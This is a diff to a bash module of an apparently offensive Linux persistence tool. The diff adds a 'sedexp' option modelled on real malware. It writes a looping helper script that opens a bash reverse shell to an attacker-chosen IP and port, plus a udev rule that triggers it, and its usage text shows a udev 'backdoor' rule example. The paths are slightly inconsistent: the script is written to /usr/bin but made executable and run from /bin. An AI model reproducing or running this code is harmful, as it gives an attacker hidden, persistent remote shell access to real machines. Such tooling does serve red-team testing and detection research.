@@ -14,14 +14,14 @@ setup_udev() {
 
 	usage_udev() {
 		echo "Usage: ./panix.sh --udev [OPTIONS]"
-		echo "--examples                   Display command examples"
-		echo "--default                    Use default udev settings"
-		echo "  --ip <ip>                    Specify IP address"
-		echo "  --port <port>                Specify port number"
-		echo "  --at | --cron | --systemd    Specify the mechanism to use"
-		echo "--custom                     Use custom udev settings"
-		echo "  --command <command>          Specify custom command"
-		echo "  --path <path>                Specify custom path"
+		echo "--examples                              Display command examples"
+		echo "--default                               Use default udev settings"
+		echo "  --ip <ip>                               Specify IP address"
+		echo "  --port <port>                           Specify port number"
+		echo "  --sedexp | --at | --cron | --systemd    Specify the mechanism to use"
+		echo "--custom                                Use custom udev settings"
+		echo "  --command <command>                     Specify custom command"
+		echo "  --path <path>                           Specify custom path"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -37,7 +37,7 @@ setup_udev() {
 				shift
 				port="$1"
 				;;
-			--at | --cron | --systemd )
+			--sedexp | --at | --cron | --systemd )
 				mechanism="$1"
 				;;
 			--custom )
@@ -54,7 +54,7 @@ setup_udev() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./panix.sh --udev --default --ip 10.10.10.10 --port 1337 --at|--cron|--systemd"
+				echo "sudo ./panix.sh --udev --default --ip 10.10.10.10 --port 1337 --sedexp|--at|--cron|--systemd"
 				echo ""
 				echo "--custom:"
 				echo "sudo ./panix.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
@@ -75,17 +75,43 @@ setup_udev() {
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
-			echo "Error: --default requires --ip and --port."
+			echo "Error: --default requires --ip, --port and one of --sedexp, --at, --cron, or --systemd."
 			echo "Try './panix.sh --udev --help' for more information."
 			exit 1
 		fi
 		if [[ -z $mechanism ]]; then
-			echo "Error: --default requires --at, --cron, or --systemd."
+			echo "Error: --default requires one of --sedexp, --at, --cron, or --systemd."
 			echo "Try './panix.sh --udev --help' for more information."
 			exit 1
 		fi
 
 		case $mechanism in
+			--sedexp )
+				# Reference: https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp
+
+				# Create a helper program to bypass network restrictions
+				cat <<-EOF > /usr/bin/sedexp
+				#!/bin/bash
+				while true; do
+					if [ -f /tmp/sedexp ]; then
+						rm /tmp/sedexp
+						nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
+					fi
+					sleep 5
+				done;
+				EOF
+
+				# Grant the program execution privileges and run it in the background
+				# This process will die on reboot. Use Systemd/cron/at for persistent execution
+				chmod +x /bin/sedexp
+				nohup /bin/sedexp &
+
+				# Create a more widely supported sedexp udev rules file based on Sedexp malware
+				cat <<-EOF > /etc/udev/rules.d/10-sedexp.rules
+				ACTION=="add", KERNEL=="random", RUN+="/usr/bin/touch /tmp/sedexp"
+				EOF
+				;;
+
 			--at )
 				# Check if 'at' utility is available
 				if ! command -v at &> /dev/null; then
@@ -101,7 +127,7 @@ setup_udev() {
 				chmod +x /usr/bin/atest
 
 				# Create the udev rules file
-				cat <<-EOF > /etc/udev/rules.d/10-atest.rules
+				cat <<-EOF > /etc/udev/rules.d/11-atest.rules
 				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/bin/at -M -f /usr/bin/atest now"
 				EOF
 				;;
